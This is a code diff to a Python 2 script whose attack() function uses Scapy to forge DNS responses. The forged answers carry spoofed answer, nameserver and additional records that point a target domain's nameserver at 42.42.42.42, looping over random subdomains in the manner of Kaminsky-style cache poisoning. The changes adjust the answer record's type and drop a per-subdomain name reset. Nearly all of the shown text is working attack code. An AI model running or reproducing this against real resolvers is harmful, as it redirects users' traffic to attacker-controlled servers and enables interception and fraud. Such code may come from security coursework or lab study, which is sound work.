@@ -66,7 +66,7 @@ def attack():
     # DNS(rd=1, qd=DNSQR(qname=base_domain))
     fake_response = DNS(rd=1, id=42, qr=1, aa=1, qdcount=1, ancount=1, nscount=1, arcount=0, 
 		qd=DNSQR(qname=base_domain), 
-		an=DNSRR(rrname=base_domain, ttl=70000, rdata='1.2.3.4', rdlen=4),
+		an=DNSRR(rrname=base_domain, ttl=70000, rdata='1.2.3.4', rdlen=4, type=1),
 		ns=(DNSRR(rrname=base_domain, type='NS', ttl=70000, rdata=spoof)),
         ar=(DNSRR(rrname=spoof, type="A", ttl=60000, rdata='42.42.42.42'))
 	)
@@ -75,7 +75,6 @@ def attack():
         # per new url:
         url = getRandomSubDomain() + '.' + base_domain
         dns_request[DNS].qd.qname = url
-        fake_response[DNS].an.rrname = url
         fake_response[DNS].qd.qname = url
         print "Now trying %s\n" % url
         print fake_response.show()
